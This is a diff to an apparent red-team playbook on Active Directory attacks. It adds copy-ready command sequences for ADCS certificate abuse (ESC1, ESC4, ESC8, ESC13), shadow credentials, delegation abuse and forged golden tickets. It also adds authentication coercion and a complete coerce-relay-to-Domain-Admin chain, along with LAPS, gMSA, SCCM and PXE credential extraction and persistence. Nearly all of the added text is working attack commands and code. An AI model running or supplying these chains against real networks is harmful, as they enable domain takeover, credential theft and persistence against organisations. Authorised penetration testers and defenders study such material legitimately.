@@ -6,6 +6,14 @@ metadata:
   phase: exploitation
   tools: impacket, mimikatz, bloodhound, rubeus, crackmapexec, powerview, responder, kerbrute
   mitre: TA0008
+kill_chain:
+  phase: [exploit, actions]
+  step: [4, 7]
+  attck_tactics: [TA0006, TA0008, TA0004]
+depends_on: [network-attack, privesc-windows]
+feeds_into: [red-team-ops, advanced-redteam]
+inputs: [domain_info, user_context]
+outputs: [domain_admin_access, finding_record, credential_dump]
 ---
 
 # Active Directory Attacks
@@ -318,3 +326,225 @@ lsadump::dcshadow /push
 | DCSync access denied | Need Replicating Directory Changes rights |
 | NTLM relay fails | Check SMB signing, try LDAP target |
 | BloodHound empty | Verify collector ran with correct creds |
+
+## Advanced: ADCS (Active Directory Certificate Services)
+
+### ESC1 — Enrollee Supplies Subject (SAN)
+```bash
+# Find vulnerable templates
+certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable -stdout
+
+# Request cert with arbitrary UPN (impersonate admin)
+certipy req -u user@domain -p pass -ca CA-NAME -template VulnTemplate \
+  -upn administrator@domain -dns dc01.domain.local
+
+# Authenticate with certificate
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+```
+
+### ESC4 — Template ACL Abuse
+```bash
+# Modify template to make it vulnerable to ESC1
+certipy template -u user@domain -p pass -template VulnTemplate -save-old
+# Template now allows enrollee to supply SAN → chain to ESC1
+
+# Restore original template after exploitation
+certipy template -u user@domain -p pass -template VulnTemplate -configuration VulnTemplate.json
+```
+
+### ESC8 — NTLM Relay to HTTP Enrollment
+```bash
+# Relay coerced NTLM auth to ADCS HTTP enrollment endpoint
+ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+
+# Coerce DC authentication
+python3 PetitPotam.py -d domain -u user -p pass RELAY_IP DC_IP
+
+# Authenticate with obtained certificate
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+```
+
+### ESC11 — Certificate Mapping (StrongCertificateBindingEnforcement=0)
+```bash
+# When certificate mapping is weak, ANY cert with matching UPN works
+# Combined with ESC1: request cert for any user, even if template is
+# not originally vulnerable, weak mapping accepts it
+```
+
+### ESC13 — Issuance Policy OID Group Link
+```bash
+# Abuse issuance policy linked to universal group
+# Enroll in template with policy → automatically added to linked group
+# If linked group has privileged access → instant escalation
+certipy req -u user@domain -p pass -ca CA-NAME -template PolicyTemplate
+```
+
+## Advanced: Shadow Credentials & Key Trust
+
+### msDS-KeyCredentialLink Abuse
+```bash
+# Requires GenericWrite over target (user or computer)
+# Add shadow credential (Key Trust)
+python3 pywhisker.py -d domain -u attacker -p pass --target victim --action add
+
+# Windows
+whisker.exe add /target:dc01$ /domain:domain.local /dc:dc01.domain.local
+
+# Get TGT with certificate
+certipy auth -pfx shadow_cred.pfx -dc-ip DC_IP
+
+# UnPAC-the-hash: get NT hash from TGT
+certipy auth -pfx shadow_cred.pfx -dc-ip DC_IP -get-hash
+```
+
+## Advanced: Kerberos Delegation Abuse
+
+### Resource-Based Constrained Delegation (RBCD)
+```bash
+# Requirements: GenericWrite on target + ability to create machine account
+# Step 1: Create machine account
+impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss' \
+  -dc-ip DC_IP domain/user:pass
+
+# Step 2: Set RBCD on target
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
+  -dc-ip DC_IP domain/user:pass
+
+# Step 3: S4U2Self + S4U2Proxy → impersonate admin
+impacket-getST -spn cifs/target.domain -impersonate administrator \
+  -dc-ip DC_IP domain/'EVIL$':'P@ss'
+
+export KRB5CCNAME=administrator@cifs_target.domain@DOMAIN.ccache
+impacket-smbexec -k -no-pass target.domain
+```
+
+### Constrained Delegation with Protocol Transition
+```bash
+# S4U2Self → S4U2Proxy for service with TrustedToAuthForDelegation
+Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator \
+  /msdsspn:cifs/target /ptt
+
+# Alternative service name abuse (SPN is not validated in S4U2Proxy)
+Rubeus.exe s4u /user:svc_web /aes256:KEY /impersonateuser:admin \
+  /msdsspn:http/target /altservice:cifs,ldap,host,mssql /ptt
+```
+
+## Advanced: Trust Attacks
+
+### SID History Injection (Cross-Forest)
+```bash
+# Get trust key
+mimikatz# lsadump::trust /patch
+
+# Forge inter-realm TGT with Enterprise Admins SID in SID History
+mimikatz# kerberos::golden /user:admin /domain:child.corp.local \
+  /sid:S-1-5-21-CHILD-DOMAIN /krbtgt:TRUST_KEY \
+  /sids:S-1-5-21-PARENT-DOMAIN-519 /service:krbtgt /target:corp.local /ptt
+
+# Access parent domain resources
+dir \\parent-dc.corp.local\c$
+```
+
+### PAM Trust Exploitation
+```bash
+# Bastion forest with PAM trust
+# DACL abuse on foreign security principals
+# Shadow principal with SID mapping to production DA
+
+# Enumerate trust relationships
+Get-ADTrust -Filter * | Select Name, Direction, TrustType, ForestTransitive
+```
+
+## Advanced: Coercion Attacks (2024-2026)
+
+### PetitPotam (MS-EFSRPC)
+```bash
+python3 PetitPotam.py -d domain -u user -p pass LISTENER_IP TARGET_IP
+# Coerces TARGET to authenticate to LISTENER via NTLM
+```
+
+### DFSCoerce (MS-DFSNM)
+```bash
+python3 DFSCoerce.py -d domain -u user -p pass LISTENER_IP TARGET_IP
+```
+
+### PrinterBug / SpoolSample (MS-RPRN)
+```bash
+python3 printerbug.py domain/user:pass@TARGET_IP LISTENER_IP
+```
+
+### ShadowCoerce (MS-FSRVP)
+```bash
+python3 shadowcoerce.py -d domain -u user -p pass LISTENER_IP TARGET_IP
+```
+
+### Coercion → Relay → Domain Admin Chain
+```bash
+# Full chain: Coerce DC → NTLM Relay → ADCS ESC8 → DA
+# Terminal 1: NTLM relay to ADCS
+ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+
+# Terminal 2: Coerce DC
+python3 PetitPotam.py RELAY_IP DC_IP
+
+# Terminal 3: Authenticate with captured certificate
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+# → NT hash of DC machine account → DCSync → Domain Admin
+```
+
+## Advanced: LAPS & gMSA Exploitation
+
+### LAPS Password Reading
+```bash
+# LAPS v1 (ms-Mcs-AdmPwd) — requires read access to attribute
+crackmapexec ldap DC_IP -u user -p pass -M laps
+
+# LAPS v2 (msLAPS-Password) — encrypted, requires specific permissions
+# Decrypt with user who has decryption rights
+
+# Python
+from ldap3 import *
+s = Server('DC_IP', get_info=ALL)
+c = Connection(s, user='domain\\user', password='pass', auto_bind=True)
+c.search('DC=domain,DC=local', '(ms-Mcs-AdmPwd=*)', attributes=['ms-Mcs-AdmPwd','sAMAccountName'])
+for entry in c.entries:
+    print(f"{entry.sAMAccountName}: {entry['ms-Mcs-AdmPwd']}")
+```
+
+### gMSA Password Extraction
+```bash
+# Requires membership in PrincipalsAllowedToRetrieveManagedPassword
+python3 gMSADumper.py -u user -p pass -d domain.local
+
+# With impacket
+impacket-ntlmrelayx --dump-gmsa
+
+# LAPS persistence — set expiration to far future
+Set-DomainObject -Identity TARGET$ \
+  -Set @{'ms-Mcs-AdmPwdExpirationTime'='132982560000000000'}
+```
+
+## Advanced: SCCM/MECM Exploitation
+
+### Site Server Takeover
+```bash
+# SCCM hierarchy takeover via NTLM relay
+# Coerce SCCM primary site → relay to MSSQL → admin on SCCM
+
+# SharpSCCM for post-exploitation
+SharpSCCM.exe local secrets -m wmi
+SharpSCCM.exe get secrets
+
+# Extract NAA (Network Access Account) credentials
+SharpSCCM.exe get naa
+```
+
+### PXE Boot Exploitation
+```bash
+# Capture PXE boot media → extract credentials
+# Variables stored in policy include admin passwords
+python3 pxethief.py 2
+# Decrypt using media certificate from SCCM
+```
